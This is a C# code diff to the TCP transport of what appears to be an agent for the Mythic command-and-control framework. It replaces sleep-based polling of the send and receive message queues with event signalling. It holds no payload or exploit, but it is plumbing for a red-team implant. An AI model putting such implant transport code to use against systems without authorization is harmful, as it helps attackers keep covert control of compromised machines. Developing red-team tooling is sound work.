@@ -26,7 +26,9 @@ namespace TcpTransport
         private AsyncTcpServer _server;
         private bool _encryptedExchangeCheck;
         private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
+        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
+        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
         private Dictionary<TcpClient, ST.Task> _writerTasks = new Dictionary<TcpClient, ST.Task>();
         private Action<object> _sendAction;
         ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
@@ -39,13 +41,10 @@ namespace TcpTransport
                 TcpClient client = (TcpClient)p;
                 while (client.Connected)
                 {
+                    _senderEvent.WaitOne();
                     if (_senderQueue.TryDequeue(out byte[] result))
                     {
                         client.GetStream().BeginWrite(result, 0, result.Length, OnAsyncMessageSent, client);
-                    }
-                    else
-                    {
-                        Thread.Sleep(1000);
                     }
                 }
             };
@@ -98,6 +97,7 @@ namespace TcpTransport
             {
                 _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(part)));
             }
+            _senderEvent.Set();
             return true;
         }
 
@@ -106,6 +106,7 @@ namespace TcpTransport
             IMythicMessage msg = Serializer.DeserializeIPCMessage(data, mt);
             Console.WriteLine("We got a message: {0}", mt.ToString());
             _recieverQueue.Enqueue(msg);
+            _receiverEvent.Set();
             return true;
         }
 
@@ -114,15 +115,12 @@ namespace TcpTransport
         {
             while (Agent.IsAlive())
             {
-                IMythicMessage msg = _recieverQueue.SingleOrDefault(m => m.GetTypeCode() == mt);
+                _receiverEvent.WaitOne();
+                IMythicMessage msg = _recieverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                 if (msg != null)
                 {
                     _recieverQueue = new ConcurrentQueue<IMythicMessage>(_recieverQueue.Where(m => m != msg));
                     return onResp(msg);
-                }
-                else
-                {
-                    Thread.Sleep(100);
                 }
             }
             return true;
